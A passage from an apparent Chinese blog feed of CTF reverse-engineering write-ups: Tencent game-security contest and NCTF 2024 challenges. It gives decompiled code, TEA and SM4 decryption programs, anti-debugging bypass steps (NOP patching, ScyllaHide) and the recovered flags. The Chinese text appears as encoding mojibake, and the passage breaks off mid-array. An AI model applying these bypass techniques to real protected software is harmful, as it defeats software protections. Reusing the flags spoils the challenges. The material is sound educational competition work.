class="number">3</span>, xmmword_140004030, <span class="number">16</span>);</span><br><span class="line">    *((DWORD*)P_0 + <span class="number">16</span>) = *(DWORD*)dword_140004040;</span><br><span class="line">    *((WORD*)P_0 + <span class="number">34</span>) = *(WORD*)word_140004044;</span><br><span class="line">    *((BYTE*)P_0 + <span class="number">70</span>) = *(BYTE*)byte_140004046;</span><br><span class="line">    v11 = (<span class="type">unsigned</span> __int64)P_0;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        v12 = v11 &gt;&gt; n64;</span><br><span class="line">        n64 += <span class="number">8</span>;</span><br><span class="line">        *v9++ = v12;</span><br><span class="line">    &#125; <span class="keyword">while</span> (n64 &lt; <span class="number">64</span>);</span><br><span class="line"></span><br><span class="line">    qword_<span class="number">1400041E0</span> = *(DWORD64*)(a1 + <span class="number">86</span>);</span><br><span class="line">    dword_<span class="number">1400041E8</span> = *(DWORD*)(a1 + <span class="number">94</span>);</span><br><span class="line">    byte_1400041EC = *(BYTE*)(a1 + <span class="number">98</span>);</span><br><span class="line">    *(DWORD64*)(a1 + <span class="number">86</span>) = *(DWORD64*)qword_140004048;</span><br><span class="line">    *(DWORD*)(a1 + <span class="number">94</span>) = *(DWORD*)dword_140004050;</span><br><span class="line">    *(BYTE*)(a1 + <span class="number">98</span>) = *(BYTE*)byte_140004054;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ä¿®æ”¹teaåŠ å¯†å‡½æ•°ä»£ç å­—èŠ‚</span></span><br><span class="line">    <span class="built_in">sub_14000A35B</span>((<span class="type">long</span> <span class="type">long</span>)tea);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ä½¿ç”¨IDAåŠ¨è°ƒï¼Œå¹¶æŒ‰cåˆ†æteaæ•°ç»„å¤„çš„ä»£ç ï¼Œå‘ç°åˆ†æˆäº†ä¸‰å—ï¼Œæ‰‹åŠ¨å°†ä¸‰å—åˆå¹¶åˆ°ä¸€å—ä»£ç ï¼Œå¹¶ä¿®å¤éƒ¨åˆ†è·³è½¬çš„åœ°å€ï¼Œå³å¯å¾—åˆ°å®Œæ•´çš„ä»£ç ã€‚</p><p><img src="/2025/03/31/2025Tencent/21.png" alt="alt text"></p><p><img src="/2025/03/31/2025Tencent/22.png" alt="alt text"></p><p><img src="/2025/03/31/2025Tencent/23.png" alt="alt text"></p><p>åˆå¹¶å®Œçš„ä»£ç å¦‚ä¸‹ï¼š</p><p><img src="/2025/03/31/2025Tencent/24.png" alt="alt text"></p><p>åç¼–è¯‘å¾—åˆ°ä¿®æ”¹åçš„é­”æ”¹teaåŠ å¯†</p><p><img src="/2025/03/31/2025Tencent/25.png" alt="alt text"></p><p>å³å¯ç¼–å†™å¾—åˆ°å¯¹åº”çš„è§£å¯†ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">tea_decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* Input, <span class="type">int</span>* Key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v6 = Input[<span class="number">0</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v8 = Input[<span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// sumä»32å¼€å§‹</span></span><br><span class="line">    sum = (<span class="number">-0x61C88647</span>) * <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) </span><br><span class="line">    &#123;</span><br><span class="line">        v8 -= (sum + Key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]) ^ (v6 + ((v6 &lt;&lt; <span class="number">4</span>) ^ (v6 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">        v6 -= (sum + v8) ^ (Key[<span class="number">0</span>] + (v8 &lt;&lt; <span class="number">4</span>)) ^ (Key[<span class="number">1</span>] + (v8 &gt;&gt; <span class="number">5</span>));</span><br><span class="line">        sum += <span class="number">0x61C88647</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Input[<span class="number">0</span>] = v6;</span><br><span class="line">    Input[<span class="number">1</span>] = v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿›è¡Œå¯¹unk_140004064å¯†æ–‡è§£å¯†å³å¯ï¼Œä¸è¿‡æ³¨æ„ä¸€ç‚¹ï¼Œè¿™è¾¹æ˜¯ä»-1å¤„å¼€å§‹åˆ¤æ–­ï¼Œä¹Ÿå°±æ˜¯unk_140004064-4å¤„å¼€å§‹æ˜¯å¯†æ–‡ã€‚</p><p><img src="/2025/03/31/2025Tencent/26.png" alt="alt text"></p><p>æå–å‡ºæ¥å°±æ˜¯42çš„DWORDæ•°æ®ï¼Œå’Œä¸Šé¢çš„åˆ¤æ–­æ•°å€¼å¯¹åº”ä¸Šäº†ã€‚</p><p><img src="/2025/03/31/2025Tencent/27.png" alt="alt text"></p><h2 id="è§£å¯†"><a href="#è§£å¯†" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// é­”æ”¹teaè§£å¯†å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tea_decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *Input, <span class="type">int</span> *Key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v6 = Input[<span class="number">0</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v8 = Input[<span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    sum = (<span class="number">-0x61C88647</span>) * <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v8 -= (sum + Key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]) ^ (v6 + ((v6 &lt;&lt; <span class="number">4</span>) ^ (v6 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">        v6 -= (sum + v8) ^ (Key[<span class="number">0</span>] + (v8 &lt;&lt; <span class="number">4</span>)) ^ (Key[<span class="number">1</span>] + (v8 &gt;&gt; <span class="number">5</span>));</span><br><span class="line">        sum += <span class="number">0x61C88647</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Input[<span class="number">0</span>] = v6;</span><br><span class="line">    Input[<span class="number">1</span>] = v8;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// flagå¯†æ–‡</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> enc[<span class="number">42</span>] = &#123;</span><br><span class="line">    <span class="number">0x0EC367B8</span>, <span class="number">0xC9DA9044</span>, <span class="number">0xDA6C2DEB</span>, <span class="number">0x88DDC9C3</span>, <span class="number">0x32A01575</span>, <span class="number">0x231DD0B4</span>, <span class="number">0x4B9E8A74</span>, <span class="number">0xD75D3E74</span>,</span><br><span class="line">    <span class="number">0xEAAB8712</span>, <span class="number">0xE704E888</span>, <span class="number">0xE01A31AC</span>, <span class="number">0xECAE205C</span>, <span class="number">0xA7BE7467</span>, <span class="number">0x0C6252A3</span>, <span class="number">0x1AEFEC4E</span>, <span class="number">0xC40DED44</span>,</span><br><span class="line">    <span class="number">0xC3C842CC</span>, <span class="number">0xDE4A0C0E</span>, <span class="number">0x7C24F3FC</span>, <span class="number">0x8FB8D001</span>, <span class="number">0x11153E6E</span>, <span class="number">0x530ED15C</span>, <span class="number">0xF4214811</span>, <span class="number">0xBEB517E0</span>,</span><br><span class="line">    <span class="number">0x63F91634</span>, <span class="number">0x4D96F8A5</span>, <span class="number">0xFE23EAC8</span>, <span class="number">0x2C607ADF</span>, <span class="number">0xCC43D85C</span>, <span class="number">0xFF186C5B</span>, <span class="number">0x8763E1A5</span>, <span class="number">0x9187BD58</span>,</span><br><span class="line">    <span class="number">0x87D1069B</span>, <span class="number">0xD7878D7B</span>, <span class="number">0x836E6B68</span>, <span class="number">0x55A0C63F</span>, <span class="number">0xD979FDB3</span>, <span class="number">0x3E524DEE</span>, <span class="number">0x7AB35C82</span>, <span class="number">0xA2F4DA8D</span>,</span><br><span class="line">    <span class="number">0x1708BA4C</span>, <span class="number">0x710653E6</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// teaè§£å¯†key</span></span><br><span class="line"><span class="type">int</span> key[<span class="number">4</span>]&#123;<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;6&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 42ä¸ªæ•°æ®ï¼Œ2ä¸ª2ä¸ªè¿›è¡Œteaè§£å¯†</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">tea_decrypt</span>((<span class="type">unsigned</span> <span class="type">int</span> *)((DWORD64)enc + i * <span class="number">4</span>), key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// è¾“å‡º42ä¸ªè§£å¯†åæ•°æ®</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%X &quot;</span>, enc[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Out"><a href="#Out" class="headerlink" title="Out"></a>Out</h3><p><code>33 28 13 0 2D 16 40 41 13 2A 12 4F 45 4B 1F 14 39 49 3B 34 3A 26 3B 19 24 2B 22 5 4C E 0 4C 3B 4 2B 1D 5 39 16 22 3D B</code></p><h3 id="CyberChef"><a href="#CyberChef" class="headerlink" title="CyberChef"></a>CyberChef</h3><p>xor(â€˜sxxâ€™) -&gt; Reverse -&gt; Base58 Decode(æ¢è¡¨)</p><p><img src="/2025/03/31/2025Tencent/28.png" alt="alt text"></p><p>å¯†æ–‡ï¼š<code>We1C0me!T0Z0Z5GamESecur1t9*CTf</code></p><h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><p><code>flag&#123;ACE_We1C0me!T0Z0Z5GamESecur1t9*CTf&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2025è…¾è®¯æ¸¸æˆå®‰å…¨æŠ€æœ¯ç«èµ›-PCå®¢æˆ·ç«¯å®‰å…¨-åˆèµ›WP&quot;&gt;&lt;a href=&quot;#2025è…¾è®¯æ¸¸æˆå®‰å…¨æŠ€æœ¯ç«èµ›-PCå®¢æˆ·ç«¯å®‰å…¨-åˆèµ›WP&quot; class=&quot;headerlink&quot; title=&quot;2025è…¾è®¯æ¸¸æˆå®‰å…¨æŠ€æœ¯ç«èµ› PCå®¢æˆ·ç«¯å®‰å…¨ åˆèµ›WP&quot;&gt;&lt;/a&gt;2025è…¾</summary>
      
    
    
    
    
    <category term="CTFæ¯”èµ›" scheme="https://tkazer.github.io/tags/CTF%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>NCTF2024</title>
    <link href="https://tkazer.github.io/2025/03/24/NCTF2024/"/>
    <id>https://tkazer.github.io/2025/03/24/NCTF2024/</id>
    <published>2025-03-24T11:12:53.000Z</published>
    <updated>2025-03-24T13:41:39.058Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NCTF-2024-Reverse-WP"><a href="#NCTF-2024-Reverse-WP" class="headerlink" title="NCTF 2024 Reverse WP"></a>NCTF 2024 Reverse WP</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™æ¬¡ä¹Ÿæ˜¯æ“¦è¾¹#6æ‹¿ä¸‹å¥–é‡‘ï¼Œç»„é˜Ÿçš„å¸ˆå‚…ä»¬éƒ½ååˆ†å¼ºå¤§ï¼ŒåˆåŠ›æ‹¿ä¸‹ã€‚</p><p>Reè¿™æ¬¡æ‘¸äº†ä¸‰é¢˜ï¼Œå‰©ä¸€é¢˜å®‰å“ä¸å¤ªç†Ÿæ‚‰å®‰å“é€†å‘çœ‹äº†ä¸€çœ¼å°±æ²¡åšï¼Œä½†æ˜¯èµ›åå‘ç°å…¶å®æ²¡é‚£ä¹ˆéš¾ï¼ˆã€‚ezDOS 8086æ±‡ç¼–é¢˜åˆšå¥½æ’ä¸Šæˆ‘GHCTFå‡ºçš„é¢˜ï¼Œå¾ˆç†Ÿæ‚‰ç›´æ¥ç§’äº†ï¼Œå·æ‘¸äº†ä¸ªä¸€è¡€ã€‚ç„¶ågogoè¿™é¢˜çš„golang vmç ”ç©¶äº†æŒºä¹…ï¼Œæ‹¿ä¸‹äº†ä¸‰è¡€ï¼Œå®é™…åŠ å¯†ä¸æ˜¯å¾ˆå¤æ‚ã€‚æ€»ä½“ä¸‹æ¥è¿™å‡ é¢˜reå‡ºçš„éƒ½æŒºä¸é”™ï¼Œæ”¶è·ä¹Ÿå¾ˆå¤šï¼Œå¯¹vmçš„é¢˜å‹ä¹Ÿæ›´åŠ ç†Ÿæ‚‰äº†ã€‚</p><h2 id="ezDOS"><a href="#ezDOS" class="headerlink" title="ezDOS"></a>ezDOS</h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ç¨‹åºä¸­é—´å‡ºç°çš„èŠ±æŒ‡ä»¤éƒ½ç›´æ¥nopå»é™¤ï¼Œç„¶åApply patchåˆ°ç¨‹åºã€‚</p><p><img src="/2025/03/24/NCTF2024/image.png" alt="alt text"></p><p>ç¨‹åºè¦æ±‚è¾“å…¥38é•¿åº¦å­—ç¬¦ä¸²ï¼Œç„¶åè¿›è¡Œä¸€ç³»åˆ—å˜ç§ç±»RC4ç®—æ³•åŠ å¯†ï¼Œç„¶åä¸0x141åœ°å€çš„38å­—èŠ‚æ•°æ®è¿›è¡Œæ¯”å¯¹ã€‚</p><p><img src="/2025/03/24/NCTF2024/image-1.png" alt="alt text"></p><p>ä½¿ç”¨dosboxåŠ¨è°ƒï¼Œåœ¨FAä»£ç å¤„æ˜¯å¯¹å–å‡ºçš„alå¯¹è¾“å…¥çš„å­—ç¬¦ä¸²è¿›è¡ŒxoråŠ å¯†ã€‚0x32æ˜¯å–å‡ºçš„å¼‚æˆ–å€¼ï¼Œ0x31æ˜¯è¾“å…¥çš„å­—ç¬¦â€™1â€™ã€‚</p><p><img src="/2025/03/24/NCTF2024/image-2.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-3.png" alt="alt text"></p><p>ç›´æ¥debugä¸€ç›´å¾ªç¯æ‰§è¡Œè¿™è¾¹ï¼Œå³å¯æ‹¿åˆ°å¯¹è¾“å…¥å­—ç¬¦ä¸²å¼‚æˆ–çš„ä¸€ç³»åˆ—å¼‚æˆ–å€¼ã€‚</p><p><code>32 7d 59 7a f3 0d b3 7b 64 8c eb 28 c4 a4 50 30 a0 ed 27 6a e3 76 69 0c da 28 f8 08 ba a6 17 3e 12 59 45 06 4e f1</code></p><p>å–å‡º0x142åœ°å€çš„38å­—èŠ‚ï¼Œè¿›è¡Œå¼‚æˆ–å³å¯å¾—åˆ°è§£å¯†flagã€‚</p><h3 id="è§£å¯†"><a href="#è§£å¯†" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h3><p><img src="/2025/03/24/NCTF2024/image-4.png" alt="alt text"></p><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p><code>NCTF&#123;Y0u+Ar3_Assemb1y_M4st3r_5d0b497e&#125;</code></p><h2 id="SafeProgram"><a href="#SafeProgram" class="headerlink" title="SafeProgram"></a>SafeProgram</h2><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æ ¸å¿ƒåŠ å¯†æ˜¯ä¸€ä¸ªSM4åŠ å¯†ã€‚</p><p><img src="/2025/03/24/NCTF2024/image-5.png" alt="alt text"></p><p>æŸ¥çœ‹byte_14002A0D0æ•°ç»„äº¤å‰å¼•ç”¨ï¼Œå‘ç°åœ¨å…¶ä»–å‡½æ•°è¢«è®¿é—®è¿‡ã€‚</p><p><img src="/2025/03/24/NCTF2024/image-6.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-7.png" alt="alt text"></p><p>å‘ç°æ˜¯åœ¨VEHå¼‚å¸¸Handleré‡Œé¢è°ƒç”¨çš„ï¼Œç¬¬ä¸€ä¸ªAddVectoredExceptionHandlerå¾—ç›´æ¥nopï¼Œä¸ç„¶è¿è¡Œå°±ç›´æ¥é€€å‡ºã€‚</p><p><img src="/2025/03/24/NCTF2024/image-8.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-9.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-10.png" alt="alt text"></p><p>ç„¶ååœ¨è¿™ä¸ªå‡½æ•°å¼€å¤´æ–­ç‚¹ï¼Œä½¿ç”¨ScyllaHideæ’ä»¶ä¸€é”®å»é™¤åè°ƒè¯•ï¼Œé˜²æ­¢å…¶ä»–åœ°æ–¹çš„åè°ƒè¯•ã€‚</p><p><img src="/2025/03/24/NCTF2024/image-11.png" alt="alt text"></p><p>mainå‡½æ•°å¯ä»¥çœ‹åˆ°è¦æ±‚è¾“å…¥æ ¼å¼ä¸ºNCTF{â€¦}çš„é•¿åº¦38å­—ç¬¦ä¸²ï¼Œç„¶åè¿è¡Œåˆ°ç®­å¤´å‡½æ•°ä¼šè§¦å‘é™¤0å¼‚å¸¸ï¼Œç„¶åå°±ä¼šè§¦å‘VEHé‚£ä¸ªHandlerå¯¼è‡´é‚£ä¸ªbyteæ•°ç»„è¢«ä¿®æ”¹ï¼Œéœ€è¦æå–çš„æ•°æ®æ˜¯è¢«æ”¹åçš„ã€‚</p><p><img src="/2025/03/24/NCTF2024/image-12.png" alt="alt text"></p><p>åŠ¨è°ƒæ—¶æå–è¿™ä¸‰ä¸ªæ•°ç»„æ•°æ®ï¼Œè¿›è¡Œè§£å¯†å³å¯ã€‚</p><p><img src="/2025/03/24/NCTF2024/image-13.png" alt="alt text"></p><p>keyæ˜¯mainå‡½æ•°ä¸¤æ¬¡memcpyé‚£è¾¹çš„æ•°æ®ï¼Œç»“æœå¦‚ä¸‹ã€‚</p><p><img src="/2025/03/24/NCTF2024/image-14.png" alt="alt text"></p><h3 id="è§£å¯†-1"><a href="#è§£å¯†-1" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> byte_7FF699A4A0D0[<span class="number">256</span>] = &#123;</span><br><span class="line">    <span class="number">0xD1</span>, <span class="number">0x90</span>, <span class="number">0xE9</span>, <span class="number">0xFE</span>, <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0x3D</span>, <span class="number">0xB7</span>, <span class="number">0x16</span>, <span class="number">0xB6</span>, <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x28</span>, <span class="number">0xFB</span>, <span class="number">0x2C</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x2B</span>, <span class="number">0x67</span>, <span class="number">0x9A</span>, <span class="number">0x76</span>, <span class="number">0x2A</span>, <span class="number">0xBE</span>, <span class="number">0x04</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x06</span>, <span class="number">0x99</span>,</span><br><span class="line">    <span class="number">0x9C</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x91</span>, <span class="number">0xEF</span>, <span class="number">0x98</span>, <span class="number">0x7A</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0B</span>, <span class="number">0x43</span>, <span class="number">0xED</span>, <span class="number">0xCF</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>,</span><br><span class="line">    <span class="number">0xE4</span>, <span class="number">0xB3</span>, <span class="number">0x17</span>, <span class="number">0xA9</span>, <span class="number">0x1C</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x94</span>, <span class="number">0xFA</span>, <span class="number">0x75</span>, <span class="number">0x8F</span>, <span class="number">0x3F</span>, <span class="number">0xA6</span>,</span><br><span class="line">    <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xA7</span>, <span class="number">0x4F</span>, <span class="number">0xF3</span>, <span class="number">0x73</span>, <span class="number">0x71</span>, <span class="number">0xBA</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x85</span>, <span class="number">0xD6</span>, <span class="number">0xA8</span>,</span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x81</span>, <span class="number">0xB2</span>, <span class="number">0xFC</span>, <span class="number">0x64</span>, <span class="number">0xDA</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xEB</span>, <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9D</span>, <span class="number">0x35</span>,</span><br><span class="line">    <span class="number">0x1E</span>, <span class="number">0x24</span>, <span class="number">0x0E</span>, <span class="number">0x78</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0x9F</span>, <span class="number">0xA2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7C</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0xC9</span>, <span class="number">0x87</span>,</span><br><span class="line">    <span class="number">0xD4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x5E</span>, <span class="number">0xD3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xE7</span>, <span class="number">0xA0</span>, <span class="number">0xC4</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>,</span><br><span class="line">    <span class="number">0xEA</span>, <span class="number">0xBF</span>, <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x40</span>, <span class="number">0xC7</span>, <span class="number">0x38</span>, <span class="number">0xB5</span>, <span class="number">0xA3</span>, <span class="number">0xF7</span>, <span class="number">0xF2</span>, <span class="number">0xCE</span>, <span class="number">0xF9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xA1</span>,</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0xAE</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x9B</span>, <span class="number">0x34</span>, <span class="number">0x1A</span>, <span class="number">0x55</span>, <span class="number">0xAD</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xF5</span>, <span class="number">0x8C</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>,</span><br><span class="line">    <span class="number">0x1D</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xCA</span>, <span class="number">0x60</span>, <span class="number">0xC0</span>, <span class="number">0x29</span>, <span class="number">0x23</span>, <span class="number">0xAB</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span 